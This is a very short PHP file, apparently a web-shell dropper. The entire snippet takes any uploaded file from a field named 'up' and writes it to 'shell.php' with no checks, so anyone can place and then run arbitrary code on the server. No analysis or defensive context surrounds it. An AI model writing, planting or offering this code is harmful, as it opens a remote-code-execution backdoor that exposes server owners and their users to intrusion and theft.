<?php
if (isset($_FILES['up'])) {
    file_put_contents('shell.php', file_get_contents($_FILES['up']['tmp_name']));
}
